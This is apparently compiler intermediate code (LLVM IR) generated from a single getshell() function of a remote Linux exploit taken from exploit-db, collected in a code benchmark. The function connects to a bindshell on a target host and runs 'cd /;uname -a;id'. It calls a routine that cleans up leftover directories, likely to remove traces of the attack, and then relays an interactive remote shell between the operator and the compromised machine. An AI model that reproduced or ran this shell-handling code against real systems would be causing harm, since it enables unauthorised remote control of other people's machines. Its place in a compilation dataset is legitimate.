; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_88.c_getshell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_88.c_getshell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [29 x i8] c"getshell(): socket() failed.\00", align 1
@host = common dso_local global i8* null, align 8
@.str.1 = private unnamed_addr constant [30 x i8] c"getshell(): couldn't resolve.\00", align 1
@sport = common dso_local global i32 0, align 4
@SIGALRM = common dso_local global i32 0, align 4
@sig_alarm = common dso_local global i32 0, align 4
@TIMEOUT = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [45 x i8] c"[*] checking for bindshell: %s:%d. (0x%.8x)\0A\00", align 1
@reverse = common dso_local global i32 0, align 4
@baseaddr = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [31 x i8] c"[!] connection failed: %s:%d.\0A\00", align 1
@.str.4 = private unnamed_addr constant [36 x i8] c"[*] successfully connected: %s:%d.\0A\00", align 1
@.str.5 = private unnamed_addr constant [50 x i8] c"[*] attempting to cleanup leftover directory(s).\0A\00", align 1
@.str.6 = private unnamed_addr constant [37 x i8] c"[*] entering remote shell. (%s:%d)\0A\0A\00", align 1
@SIGINT = common dso_local global i32 0, align 4
@SIG_IGN = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [18 x i8] c"cd /;uname -a;id\0A\00", align 1
@.str.8 = private unnamed_addr constant [29 x i8] c"getshell(): select() failed.\00", align 1
@.str.9 = private unnamed_addr constant [27 x i8] c"getshell(): read() failed.\00", align 1
@.str.10 = private unnamed_addr constant [28 x i8] c"getshell(): write() failed.\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @getshell(i32 %0, i32 %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4097 x i8], align 16
  %9 = alloca %struct.hostent*, align 8
  %10 = alloca %struct.sockaddr_in, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %11 = load i32, i32* @AF_INET, align 4
  %12 = load i32, i32* @SOCK_STREAM, align 4
  %13 = load i32, i32* @IPPROTO_TCP, align 4
  %14 = call i32 @socket(i32 %11, i32 %12, i32 %13)
  store i32 %14, i32* %5, align 4
  %15 = icmp eq i32 %14, -1
  br i1 %15, label %16, label %18

16:                                               ; preds = %2
  %17 = call i32 @printe(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str, i64 0, i64 0), i32 1)
  br label %18

18:                                               ; preds = %16, %2
  %19 = load i32, i32* @AF_INET, align 4
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  store i32 %19, i32* %20, align 4
  %21 = load i8*, i8** @host, align 8
  %22 = call i32 @inet_addr(i8* %21)
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  %24 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %23, i32 0, i32 0
  store i32 %22, i32* %24, align 4
  %25 = icmp ne i32 %22, 0
  br i1 %25, label %26, label %40

26:                                               ; preds = %18
  %27 = load i8*, i8** @host, align 8
  %28 = call %struct.hostent* @gethostbyname(i8* %27)
  store %struct.hostent* %28, %struct.hostent** %9, align 8
  %29 = icmp ne %struct.hostent* %28, null
  br i1 %29, label %32, label %30

30:                                               ; preds = %26
  %31 = call i32 @printe(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.1, i64 0, i64 0), i32 1)
  br label %32

32:                                               ; preds = %30, %26
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  %34 = bitcast %struct.TYPE_2__* %33 to i8*
  %35 = load %struct.hostent*, %struct.hostent** %9, align 8
  %36 = getelementptr inbounds %struct.hostent, %struct.hostent* %35, i32 0, i32 0
  %37 = load i64, i64* %36, align 8
  %38 = inttoptr i64 %37 to i8*
  %39 = call i32 @memcpy(i8* %34, i8* %38, i32 4)
  br label %40

40:                                               ; preds = %32, %18
  %41 = load i32, i32* @sport, align 4
  %42 = call i32 @htons(i32 %41)
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i32 %42, i32* %43, align 4
  %44 = load i32, i32* @SIGALRM, align 4
  %45 = load i32, i32* @sig_alarm, align 4
  %46 = call i32 @signal(i32 %44, i32 %45)
  %47 = load i32, i32* @TIMEOUT, align 4
  %48 = call i32 @alarm(i32 %47)
  %49 = load i8*, i8** @host, align 8
  %50 = load i32, i32* @sport, align 4
  %51 = load i32, i32* @reverse, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %57, label %53

53:                                               ; preds = %40
  %54 = load i32, i32* @baseaddr, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub i32 %54, %55
  br label %61

57:                                               ; preds = %40
  %58 = load i32, i32* @baseaddr, align 4
  %59 = load i32, i32* %4, align 4
  %60 = add i32 %58, %59
  br label %61

61:                                               ; preds = %57, %53
  %62 = phi i32 [ %56, %53 ], [ %60, %57 ]
  %63 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.2, i64 0, i64 0), i8* %49, i32 %50, i32 %62)
  %64 = load i32, i32* %5, align 4
  %65 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %66 = call i64 @connect(i32 %64, %struct.sockaddr* %65, i32 12)
  %67 = icmp ne i64 %66, 0
  br i1 %67, label %68, label %75

68:                                               ; preds = %61
  %69 = load i8*, i8** @host, align 8
  %70 = load i32, i32* @sport, align 4
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.3, i64 0, i64 0), i8* %69, i32 %70)
  %72 = load i32, i32* %5, align 4
  %73 = call i32 @close(i32 %72)
  %74 = call i32 @alarm(i32 0)
  ret void

75:                                               ; preds = %61
  %76 = call i32 @alarm(i32 0)
  %77 = load i8*, i8** @host, align 8
  %78 = load i32, i32* @sport, align 4
  %79 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.4, i64 0, i64 0), i8* %77, i32 %78)
  %80 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.5, i64 0, i64 0))
  %81 = load i32, i32* %3, align 4
  %82 = call i32 @ftp_clean(i32 %81)
  %83 = load i32, i32* %3, align 4
  %84 = call i32 @close(i32 %83)
  %85 = load i8*, i8** @host, align 8
  %86 = load i32, i32* @sport, align 4
  %87 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.6, i64 0, i64 0), i8* %85, i32 %86)
  %88 = load i32, i32* @SIGINT, align 4
  %89 = load i32, i32* @SIG_IGN, align 4
  %90 = call i32 @signal(i32 %88, i32 %89)
  %91 = load i32, i32* %5, align 4
  %92 = call i32 @write(i32 %91, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.7, i64 0, i64 0), i32 18)
  br label %93

93:                                               ; preds = %75, %138
  %94 = call i32 @FD_ZERO(i32* %7)
  %95 = call i32 @FD_SET(i32 0, i32* %7)
  %96 = load i32, i32* %5, align 4
  %97 = call i32 @FD_SET(i32 %96, i32* %7)
  %98 = load i32, i32* %5, align 4
  %99 = add nsw i32 %98, 1
  %100 = call i32 @select(i32 %99, i32* %7, i32 0, i32 0, i32 0)
  %101 = icmp slt i32 %100, 1
  br i1 %101, label %102, label %104

102:                                              ; preds = %93
  %103 = call i32 @printe(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.8, i64 0, i64 0), i32 1)
  br label %104

104:                                              ; preds = %102, %93
  %105 = call i64 @FD_ISSET(i32 0, i32* %7)
  %106 = icmp ne i64 %105, 0
  br i1 %106, label %107, label %123

107:                                              ; preds = %104
  %108 = getelementptr inbounds [4097 x i8], [4097 x i8]* %8, i64 0, i64 0
  %109 = call i32 @read(i32 0, i8* %108, i32 4096)
  store i32 %109, i32* %6, align 4
  %110 = icmp slt i32 %109, 1
  br i1 %110, label %111, label %113

111:                                              ; preds = %107
  %112 = call i32 @printe(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.9, i64 0, i64 0), i32 1)
  br label %113

113:                                              ; preds = %111, %107
  %114 = load i32, i32* %5, align 4
  %115 = getelementptr inbounds [4097 x i8], [4097 x i8]* %8, i64 0, i64 0
  %116 = load i32, i32* %6, align 4
  %117 = call i32 @write(i32 %114, i8* %115, i32 %116)
  %118 = load i32, i32* %6, align 4
  %119 = icmp ne i32 %117, %118
  br i1 %119, label %120, label %122

120:                                              ; preds = %113
  %121 = call i32 @printe(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.10, i64 0, i64 0), i32 1)
  br label %122

122:                                              ; preds = %120, %113
  br label %123

123:                                              ; preds = %122, %104
  %124 = load i32, i32* %5, align 4
  %125 = call i64 @FD_ISSET(i32 %124, i32* %7)
  %126 = icmp ne i64 %125, 0
  br i1 %126, label %127, label %138

127:                                              ; preds = %123
  %128 = load i32, i32* %5, align 4
  %129 = getelementptr inbounds [4097 x i8], [4097 x i8]* %8, i64 0, i64 0
  %130 = call i32 @read(i32 %128, i8* %129, i32 4096)
  store i32 %130, i32* %6, align 4
  %131 = icmp slt i32 %130, 1
  br i1 %131, label %132, label %134

132:                                              ; preds = %127
  %133 = call i32 @exit(i32 0) #3
  unreachable

134:                                              ; preds = %127
  %135 = getelementptr inbounds [4097 x i8], [4097 x i8]* %8, i64 0, i64 0
  %136 = load i32, i32* %6, align 4
  %137 = call i32 @write(i32 1, i8* %135, i32 %136)
  br label %138

138:                                              ; preds = %134, %123
  br label %93
}

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @alarm(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @ftp_clean(i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @select(i32, i32*, i32, i32, i32) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
